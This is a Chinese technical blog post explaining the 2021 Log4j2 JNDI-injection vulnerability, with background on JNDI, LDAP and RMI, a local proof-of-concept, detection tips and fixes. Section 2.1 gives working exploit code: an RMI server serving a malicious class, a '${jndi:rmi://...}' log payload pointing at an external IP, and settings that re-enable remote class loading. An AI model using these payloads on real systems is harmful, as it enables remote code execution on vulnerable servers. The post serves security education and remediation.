---
title: Tech-Share系列CP1——Log4j漏洞
reward: true
declare: true
gitalkenable: true
categories: Technology
toc: true
top: 6
tags:
  - Log4j
abbrlink: 6c3cc74d
date: 2021-12-12 22:18:36
---
---

* 2021.11.24日，阿里云安全团队向Apache官方通报了Log4j2存在远程代码执行漏洞
  * 简单介绍Log4j2的概念和作用
  * 简单分析下Log4j2漏洞的产生原因，以及解决方案
    * JNDI：Java 命名与目录接口，提供了用名称来访问对象资源的能力
    * LDAP：轻型目录访问协议，定义了如何访问目录服务中的内容
    * 两者配合，可以完成对服务器目录的操作，如增删改查
  * **问题思考：JNDI与目前主流框架的配置文件的思想和原理是否类似**
  * 本人技术小白，欢迎大神交流指导

![Violet](https://gitee.com/chthollists/PicRepo/raw/master/violet/Violet06.jpg)

<!-- more -->

# Tech-Share系列CP1——Log4j漏洞

## 1. Log4j代码执行漏洞

### 1.1 Log4j的简介

*  日志框架
   *  常用日志框架：Log4j、SLF4J、Logback框架(三者均由Ceki Gulcu开发)，Log4j2(Apache)
   *  用来监视代码中变量的变化情况，周期性的记录到文件中供其他应用进行统计分析工作
   *  跟踪代码运行时轨迹，作为日后审计的依据
   *  担当集成开发环境中的调试器的作用，向文件或控制台打印代码的调试信息
*  `Log4j2`日志框架
   *  Apache Log4j2是Apache的一款Java日志框架，也可以在 C、C++、.Net、PL/SQL 程序中使用
   *  官网教程地址：[Log4j – Apache Log4j 2](https://logging.apache.org/log4j/2.x/)，[GitHub仓库地址](https://github.com/apache/logging-log4j2)
   *  `Log4j2` 作为日志记录基础第三方库，被大量 Java 框架及应用使用，如：Strusts2、Solr、Driud、Flink、Kakfa、Dubbo等Apache组件，以及Elasticsearch、Redis等其他应用
   *  Log4j 2 是对 Log4j 的重大升级，完全重写了 log4j 的日志实现
   *  Log4j 2 提供了 Logback 中可用的许多改进，同时修复了 Logback 架构中的一些固有问题
   *  Log4j2 也支持 SLF4J，可以自动重新加载日志配置，并支持高级过滤选项
   *  Log4j2 允许基于 lambda 表达式对日志语句进行延迟评估，为低延迟系统提供异步记录器，并提供无垃圾模式以避免由垃圾收集器操作引起的任何延迟

### 1.2 Lookups功能

* `Log4j2`的使用

  * 引入` log4j-core`依赖包
  * 通过配置`logger`对象来在日志中输出信息，如：`logger.info("用户名: {}", username)`

* Lookups

  * `Log4j2`可以输出一个内存中的Java对象

  * 而当要输出的对象不在程序中，而是在网络、文件中时，`Log4j2`提供了Lookups的功能来实现

  * Lookups类似于一个接口，就是允许在输出日志的时候，通过某种方式去查找要输出的内容

  * 具体查找的方式与过程需要编写具体的模块去实现，即类似接口、多态、服务发现的概念

  * `Log4j2`提供了常见的查找方式，其他需求则由开发者自行提供

    ![lookups默认支持的方式](https://gitee.com/chthollists/PicRepo/raw/master/Technology/log4j2/lookups%E9%BB%98%E8%AE%A4%E6%94%AF%E6%8C%81%E7%9A%84%E6%96%B9%E5%BC%8F.bmp)

  * 其中，`Log4j2`提供的`JNDI`方式的lookups，这也是产生漏洞的直接原因

    > ```xml
    > <File name="Application" fileName="application.log">
    >     <PatternLayout>
    >         <pattern>%d %p %c{1.} [%t] $${jndi:logging/context-name} %m%n</pattern>
    >     </PatternLayout>
    > </File>
    > ```

  * 在2.17版本中，需要通过配置` log4j2.enableJndiLookup=true`才可以开启`JNDI`方式的lookups，默认情况下不开启，从而解决漏洞

### 1.3 JNDI简介

* JNDI的概念与作用：Java Naming and Directory Interface
  * JNDI即Java命名和目录接口，是Java的一个目录服务应用程序接口(API)，其核心就是命名与目录两大特性
  
  * JNDI提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象，增强了系统的可维护性
  
  * 因为不同的数据源肯定有不同的查找方式，所以JNDI也只是一个上层封装、接口，具体的实现由不同的数据源自行提供
  
  * 常见的JNDI的实现有：LDAP目录访问协议、DNS(Domain Name System)域名解析系统、RMI(Remote Method Invocation)远程方法调用等
  
    ![JNDI框图](https://gitee.com/chthollists/PicRepo/raw/master/Technology/log4j2/JNDI%E6%A1%86%E5%9B%BE.png)
  
*  JNDI中的命名：Naming：名称关联对象

  *  JNDI中的命名是将Java对象以某个名称的形式绑定(binding)到一个容器环境(Context)中
  * 以后调用容器环境的查找(lookup)方法又可以查找出某个名称所绑定的Java对象

*  JNDI中的目录：Directory：名称关联对象属性信息

  * JNDI中的目录与文件系统中的目录概念有很大的不同，Directory是指将一个对象的所有属性信息保存到一个容器环境中
  * JNDI的目录原理与JNDI的命名原理非常相似，主要的区别在于目录容器环境中保存的是对象的属性信息，而不是对象本身，所以，目录提供的是对属性的各种操作
  * 事实上，JNDI的目录与命名往往是结合在一起使用的，JNDI API中提供的代表目录容器环境的类为`DirContext`，`DirContext`是`Context`的子接口，显然它除了能完成目录相关的操作外，也能完成所有的命名操作
  * `DirContext`是对`Context`的扩展，它在`Context`的基础上增加了对目录属性的操作功能，可以在其中绑定对象的属性信息和查找对象的属性信息
  * 一个`DirContext`容器环境中即可以绑定对象自身(命名)，也可以绑定对象的属性信息(目录)，一个属性可以有多个属性值
  * 绑定的对象和绑定的属性是完全独立的两个事物，即使它们的绑定名称相同，它们的操作也是完全独立的
  * 与`Context`的操作原理类似，JNDI API中提供了一个`InitialDirContext`类来创建用作JNDI命名与目录属性操作的入口`DirContext`对象

* JNDI的使用

  * 重要API：`InitialContext`类、`InitialDirContext`类、`Context`接口、`DirContext`接口、`<jndi- name>`标签
  * JNDI API中提供了一个`InitialContext`类来创建用作JNDI命名操作的入口`Context`对象
  * `Context`是一个接口，`Context`对象实际上是某个实现类的实例对象，选择这个具体的`Context`实现类并创建其实例对象的过程是由一个`Context`工厂类来完成的
  * `Context`工厂类的类名可以通过JNDI的环境属性`java.naming.factory.initial`指定，也可以根据`Context`的操作方法的url参数的`Schema`来选择
  * 容器环境(Context)本身也是一个Java对象，它也可以通过一个名称绑定到另一个容器环境中
  * 将一个`Context`对象绑定到另外一个`Context`对象中，这就形成了一种父子级联关系，多个`Context`对象最终可以级联成一种树状结构，树中的每个`Context`对象中都可以绑定若干个Java对象

* JNDI示例

  * JNDI常常结合JDBC一起使用

    > 为数据源对象映射一个服务名称，当数据源对象改变时，无需修改代码，使用原来的名称仍可以访问新的对象，进而实现对数据库的访问。

  * JDBC直接访问数据库：更换数据库、更换用户、密码时需要修改代码

    > ```java
    > Connection conn = null;
    > try {
    >     Class.forName("com.mysql.jdbc.Driver");
    >     conn = DriverManager.getConnection("jdbc:mysql://mysql_IP?user=xxx&password=xxx");
    >     // use MySQL
    > }catch (Exception e) {
    >     e.printStackTrace();
    > }finally {
    >     if(conn != null) {
    >         try {
    >             conn.close();
    >         }catch (SQLException e) {
    >             e.printStackTrace();
    >         }
    >     }
    > }
    > ```

  * JNDI方式关联名称访问：配置相关XML文件：`<jndi- name>`标签

    > ```java
    > // 无需修改代码
    > Connection conn = null;
    > try {
    >     // 获取上下文对象
    >     Context context = new InitialContext();
    >     // 获取JNDI名称对应的数据源对象，jndiName如mysql-jndi
    >     Object dataSourceObj = context.lookup("java:jndiName");
    >     // 类型转换，获取数据源对象
    >     DataSource dataSource = (DataSource) dataSourceObj;
    >     conn = dataSource.getConnection();
    >     // use MySQL
    > }catch (Exception e) {
    >     e.printStackTrace();
    > }finally {
    >     if(conn != null) {
    >         try {
    >             conn.close();
    >         }catch (SQLException e) {
    >             e.printStackTrace();
    >         }
    >     }
    > }
    > ```

### 1.4 LDAP与RMI

* LDAP的概念和作用：Lightweight Directory Access Protocol

  * LDAP即轻量级目录访问协议，实际上就是JNDI的一种实现
  * LDAP是访问目录数据库的一种协议，多用于统一身份认证领域

* 目录数据库

  * 目录数据库是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，l类似Linux/Unix系统中的文件目录一样
  * 目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据，目录数据库天生是用来查询的

* RMI的概念和作用：Remote Method Invocation

  * RMI即远程方法调用，是一种用于实现远程过程调用(RPC)的Java API， 能直接传输序列化后的Java对象和[分布式垃圾收集](https://links.jianshu.com/go?to=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FDistributed_Garbage_Collection)
  * RMI的实现依赖于JVM虚拟机，因此它仅支持从一个JVM到另一个JVM的调用
  * 参考资料：[分布式架构基础:Java RMI详解 - 简书 (jianshu.com)](https://www.jianshu.com/p/de85fad05dcb)

* RMI的简单实现

  * 服务端：注册Java对象

    > ```java
    > public class RegistryService {
    >     public static void main(String[] args) {
    >         try {
    >             // 本地主机上的远程对象注册表Registry的实例,默认端口1099
    >             Registry registry = LocateRegistry.createRegistry(1099);
    >             // 创建一个远程对象
    >             HelloRegistryFacade hello = new HelloRegistryFacadeImpl();
    >             // 把远程对象注册到RMI注册服务器上，并命名为HelloRegistry
    >             registry.rebind("HelloRegistry", hello);
    >             System.out.println("======= 启动RMI服务成功! =======");
    >         } catch (RemoteException e) {
    >             e.printStackTrace();
    >         }
    >     }
    > }
    > ```

  * 接口及实现类

    > ```java
    > // 接口
    > public interface HelloRegistryFacade extends Remote {
    >     String helloWorld(String name) throws RemoteException;
    > }
    > 
    > // 实现类，继承 UnicastRemoteObject
    > public class HelloRegistryFacadeImpl extends UnicastRemoteObject implements HelloRegistryFacade{
    >     public HelloRegistryFacadeImpl() throws RemoteException {
    >         super();
    >     }
    >     
    >     @Override
    >     public String helloWorld(String name) {
    >         return "[Registry] 你好!" + name;
    >     }
    > }
    > ```

  * 客户端：远程调用服务器注册的对象

    > ```java
    > public class RegistryClient {
    >     public static void main(String[] args) {
    >         try {
    >             Registry registry = LocateRegistry.getRegistry(1099);
    >             HelloRegistryFacade hello = (HelloRegistryFacade) registry.lookup("HelloRegistry");
    >             String response = hello.helloWorld("RMI远程调用~~~");
    >             System.out.println("=======> " + response + " <=======");
    >         } catch (NotBoundException | RemoteException e) {
    >             e.printStackTrace();
    >         }
    >     }
    > }
    > ```

  * 解析

    * Registry(注册表)是放置所有服务器对象的命名空间，相当于一个容器
    * 每次服务端创建一个对象时，它都会使用`bind()`或`rebind()`方法注册该对象，这些是使用称为绑定名称的唯一名称注册的
    * 客户端可以通过服务端绑定的名称从注册表中获取、调用远程对象，使用`lookup()`方法

### 1.5 Log4j2漏洞

* 漏洞简介：漏洞评级：严重(最高级)

  * 2021 年 11 月 24 日，阿里云安全团队向 Apache 官方报告了 `Apache Log4j2` 远程代码执行漏洞，12 月 10 日凌晨，漏洞细节公开
  * 由于 `Apache Log4j2` 某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞
  * 只要用到 `Log4j2` 进行日志输出且日志内容能被攻击者部分可控，即可能会受到漏洞攻击影响，攻击者可以通过漏洞远程执行任意代码
  * 漏洞版本：`Apache Log4j2 2.0 ~ 2.14.1`，以及`2.15.0-rc1`

  ![阿里云漏洞报告](https://gitee.com/chthollists/PicRepo/raw/master/Technology/log4j2/%E9%98%BF%E9%87%8C%E4%BA%91%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A.bmp)

* Lookup：递归解析功能

  * 攻击手段：https://github.com/apache/pulsar/issues/13232
  * 注入问题所在的源码：`log4j-core`包下的`org.apache.logging.log4j.core.lookup.JndiLookup#lookup`

* `Log4j2`漏洞原理

  * `Log4j2`的`Lookup`

    * Log4j2的漏洞版本中，可以通过lookup功能向其配置文件的任意位置注入代码，该功能允许开发者通过一些协议去读取相应环境中的配置，但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生
    * 注入的方式类似 SQL 注入，即把变量替换为{实际代码}
    * 再加上这些版本中用到的 JNDI 特性并没有为 LDAP、RMI 提供足够的保护，使得注入的任意代码都能被肆无忌惮地执行

  * JNDI注入攻击：主要是通过LDAP、RMI两种方式

    * Java支持通过JNDI的方式去远程访问、请求对应的数据，访问普通数据时不会有风险，但是访问对象时会有风险
    * Java对象一般只存在于内存中，但也可以通过序列化的方式将其存储到文件中，或者通过网络传输
    * Java支持过JNDI的方式去远程去访问、下载一个class文件，并加载、构建该对象，主要的具体实现有LDAP、RMI等
    * 当Java对象比较大时，直接通过LDAP存储不方便，而是通过类似二次跳转的方式，不直接返回对象内容，而是跳转到该对象所在的class文件查找

    * 如果远程下载的URL指向的是一个黑客的服务器，并且下载的class文件里面藏有恶意代码，就可以进行恶意攻击

* 漏洞举例

  * 在使用Log4j2打印日志时，如果发现日志内容中包含关键词`${...}`

  * 那么这个里面包含的内容会当做变量来进行替换，导致攻击者可以任意执行命令，如

    > ```java
    > String userAgent = request.getHeader("User-Agent");
    > logger.info(userAgent);
    > 
    > // User-Agent : ${jndi:ldap://127.0.0.1/exploit}
    > ```

  * 由于HTTP请求中的User-Agent属于外界输入的信息，可以由外界任意修改，所以当Log4j2根据`JNDI LDAP`的方式去请求指定的服务器上的资源时，就有可能被恶意攻击

  * 由于线上Web业务的任何数据都可能写入Log4j2，甚至一些pre-auth的地方，比如注册、登录，实际攻击入口取决于业务具体情况

  * 目前百度搜索、苹果 iCloud 搜索、360 搜索等都出现了该问题

---

## 2. 漏洞解决方案

### 2.1 漏洞示例

* 漏洞本质

  > 本次远程代码执行漏洞正是由于组件存在 Java JNDI 注入漏洞，当程序将用户输入的数据记录到日志时，攻击者通过构造特殊请求，来触发 Apache Log4j2 中的远程代码执行漏洞，从而利用此漏洞在目标服务器上执行任意代码。

  ![Log4j2漏洞原理：JNDI注入攻击](https://gitee.com/chthollists/PicRepo/raw/master/Technology/log4j2/Log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9AJNDI%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB.png)

* 实际案例：`Minecraft Java`版本服

  > 该项目使用`Log4j`来记录用户聊天日志，因此玩家只需要在聊天窗口输入可以注入的命令代码，就可以轻松作弊。

* 本地演示：`JNDI RMI`注入方式

  * 攻击者服务器：恶意类：`EvilAttacker`

    > ```java
    > package com.log4j2.rmi;
    > 
    > import javax.naming.Context;
    > import javax.naming.Name;
    > import javax.naming.spi.ObjectFactory;
    > import java.util.Hashtable;
    > 
    > public class EvilAttacker implements ObjectFactory {
    >     static {
    >         System.out.println("远程调用的类：模拟黑客攻击！！！");
    >         System.out.println("加载、执行外部的远程类，可以恶意攻击！！！");
    >     }
    > 
    >     @Override
    >     public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
    >         return null;
    >     }
    > }
    > ```

  * 攻击者服务器：RMI注册恶意类：`RMIServer`

    > ```java
    > package com.log4j2.rmi;
    > 
    > import com.sun.jndi.rmi.registry.ReferenceWrapper;
    > 
    > import javax.naming.Reference;
    > import java.rmi.registry.LocateRegistry;
    > import java.rmi.registry.Registry;
    > 
    > public class RMIServer {
    > 
    >     public static void main(String[] args) {
    >         try {
    >             Registry registry = LocateRegistry.createRegistry(1099);
    >             // LocateRegistry.getRegistry()
    >             System.out.println("Create a RMI registry on port 1099");
    >             Reference reference = new Reference("com.log4j2.rmi.EvilAttacker", "com.log4j2.rmi.EvilAttacker", null);
    >             ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
    >             registry.bind("evilAttacker", referenceWrapper);
    >         } catch (Exception e) {
    >             e.printStackTrace();
    >         }
    >     }
    > }
    > 
    > ```

  * `Log4j2`依赖引入：`log4j-core`和`log4j-api`

    > ```xml
    > <dependencies>
    >     <!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core -->
    >     <dependency>
    >         <groupId>org.apache.logging.log4j</groupId>
    >         <artifactId>log4j-core</artifactId>
    >         <version>2.14.1</version>
    >     </dependency>
    > 
    >     <!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api -->
    >     <dependency>
    >         <groupId>org.apache.logging.log4j</groupId>
    >         <artifactId>log4j-api</artifactId>
    >         <version>2.14.1</version>
    >     </dependency>
    > </dependencies>
    > ```

  * 日志配置文件：`log4j2.xml`

    > ```xml
    > <?xml version="1.0" encoding="UTF-8"?>
    > <!--日志级别以及优先级排序: OFF > FATAL > ERROR > WARN > INFO > DEBUG > TRACE > ALL -->
    > <!--Configuration后面的status用于设置log4j2自身内部的信息输出，可以不设置，当设置成trace时，可以看到log4j2内部各种详细输出-->
    > <configuration status="INFO">
    >     <!--先定义所有的appender-->
    >     <appenders>
    >         <!--输出日志信息到控制台-->
    >         <console name="Console" target="SYSTEM_OUT">
    >             <!--控制日志输出的格式-->
    >             <PatternLayout pattern="%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
    >         </console>
    >     </appenders>
    >     <!--然后定义logger，只有定义了logger并引入的appender，appender才会生效-->
    >     <!--root：用于指定项目的根日志，如果没有单独指定Logger，则会使用root作为默认的日志输出-->
    >     <loggers>
    >         <root level="info">
    >             <appender-ref ref="Console"/>
    >         </root>
    >     </loggers>
    > </configuration>
    > ```

  * 应用的日志模块：`Log4jTest`

    > ```java
    > package com.log4j2.vulnerabilty;
    > 
    > import org.apache.logging.log4j.LogManager;
    > import org.apache.logging.log4j.Logger;
    > 
    > public class Log4jTest {
    >     private static final Logger LOGGER = LogManager.getLogger();
    > 
    >     public static void main(String[] args) {
    >         String password = "666666";
    >         LOGGER.info("password: {}", password);
    >         password = "${java:os}";
    >         LOGGER.info("password: {}", password);
    >         password = "${java:vm}";
    >         LOGGER.info("password: {}", password);
    > 
    >         String username = "${jndi:rmi://180.209.6.205:1099/evilAttacker}";
    >         LOGGER.info("username: {}", username);
    >     }
    > }
    > ```

  * 测试结果

    ![RMI方式注入攻击测试](https://gitee.com/chthollists/PicRepo/raw/master/Technology/log4j2/RMI%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95.bmp)

  * 注意

    * 恶意类注意要实现`ObjectFactory`接口，避免`javax.naming.NamingException`和`ClassCastException`异常(cannot be cast to javax.naming.spi.ObjectFactory)

    * 案例是本机同一工程下模拟的，所以RMI注册服务时`new Reference()`的第三个参数`factoryLocation`直接是null

    * 当实际的黑客攻击时，恶意类和`RMIServer`都是在不同工程、不同电脑的，此时要将第三个参数`factoryLocation`设置为其服务器上存放恶意类字节码文件的位置，可以是FTP，HTTP协议。如：`http://180.209.6.205:80/`(Nginx代理)

    * 由于JDK 版本原因可能会报`The object factory is untrusted`类似错误， 在`Log4j2Test`类中添加

      > ```java
      > System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
      > System.setProperty("java.rmi.server.useCodebaseOnly", "false");
      > ```

### 2.2 解决方案

* 快速检测是否被攻击

  * 方式一：DNSLog域名请求的探测

    > 由于攻击者在攻击过程中可能使用 DNSLog 进行漏洞探测，建议企业可以通过流量监测设备监控是否有相关 DNSLog 域名的请求，如：微步的OneDNS 可以识别主流 DNSLog 域名并支持拦截。

  * 方式二：检测日志中是否包含`JNDI`相关字符

    > 可以通过监测相关流量或者日志中是否存在`jndi:ldap://`、`jndi:rmi`等字符来发现可能的攻击行为。

* 排查项目是否有漏洞

  > 是否引入了`Apache log4j-core`依赖包。

* 最终修复措施：升级`Log4j2`以及相关组件的版本

  * 漏洞版本：`Apache Log4j 2.x < 2.15.0-rc2`

  * 解决版本：`Log4j2 2.15.0.rc2`：https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2，实际上是默认禁用了lookup功能

  * 升级相关组件的版本：如：`spring-boot-starter-log4j2`、`Apache Struts2`、`Apache Solr`、`Apache Druid`、`Apache Flink`等

    > ```xml
    > <!-- Maven -->
    > <properties>
    >  <log4j2.version>2.15.0</log4j2.version>
    > </properties>
    > ```
    
    ![Issue讨论](https://gitee.com/chthollists/PicRepo/raw/master/Technology/log4j2/Issue%E8%AE%A8%E8%AE%BA.bmp)
  
* 紧急修复措施：修改配置，关闭Lookup功能来缓解漏洞

  * 修改JVM参数：`-Dlog4j2.formatMsgNolookups=true`

  * 修改环境变量：`LOG4J_FORMAT_MSG_NO_LOOKUPS`设置为`true`

  * 修改配置：`log4j2.formatMsgNoLookups=True`

  * 特别的：对于版本在 2.0-beta9 到 2.10.0 之间的应用， 可以直接移除从`classpath`中移除  `JndiLookup` 类

    > `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`

    ![解决方案](https://gitee.com/chthollists/PicRepo/raw/master/Technology/log4j2/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.bmp)

* 其他措施(实际不可用)：升级JDK版本，限制JNDI

  > 升级JDK版本至`6u211`、`7u201`、`8u191`、`11.0.1`以上，可以在一定程度上限制利用JNDI的攻击。
  
* 版本修复的内容：对`JNDI lookup`进行多方面的限制

  * 限制一：默认不再支持二次跳转（也就是命名引用）的方式获取对象
  * 限制二：只有在`log4j2.allowedLdapClasses`列表中指定的类才能获取
  * 限制三：只有远程地址是本地地址或者在`log4j2.allowedLdapHosts`列表中指定的地址才能获取
  * 结论：通过限制`JNDI lookup`，避免攻击者通过打印日志去远程加载外部类并执行的问题

### 2.3 新的漏洞

* 拒绝服务攻击漏洞
  * 新版本：`Log4j2 2.16.0`版本
  * 新的漏洞：CVE-2021-45105记录表明，在特定配置条件下，攻击者可以通过构造包含递归查找的恶意数据，来控制线程上下文映射 (MDC)，导致StackOverflowError产生并终止进程，实现拒绝服务攻击
  * 影响版本：`Log4j2 2.0-alpha1 ~ 2.16.0`

* 解决方案：`log4j-core`依赖包升级到2.17版本

  > ```xml
  > <dependency>
  >     <groupId>org.apache.logging.log4j</groupId>
  >     <artifactId>log4j-core</artifactId>
  >     <version>2.17.0</version>
  > </dependency>
  > ```

### 2.4 安全思考

* `Fastjson`远程代码执行漏洞

  > 2020 年 5 月，360 网络安全响应中心发布**Fastjson 远程代码执行漏洞通告**。通告称，Java 库 `fastjson <= 1.2.68` 版本存在远程代码执行漏洞，漏洞被利用可直接获取服务器权限。该漏洞评定为高危漏洞，影响面广泛。

* `Apach Shiro`加密算法漏洞

  > 2019 年，阿里云应急响应中心监测到，Apach Shiro 官方披露了其 cookie 持久化参数 rememberMe 加密算法存在漏洞，攻击者利用 Padding Oracle 攻击手段可构造恶意的 rememberMe 值，绕过加密算法验证，执行 java 反序列化操作，最终可导致远程命令执行获取服务器权限，风险极大。

* 安全应该是一个持续的过程，不能因为近期没有发生安全漏洞，那么看起来没有问题的部分就不进行修复

---

### 参考资料

* SpringBoot官方博客：https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot
* Apache Log4j2官方回复：https://issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3201?filter=allissues

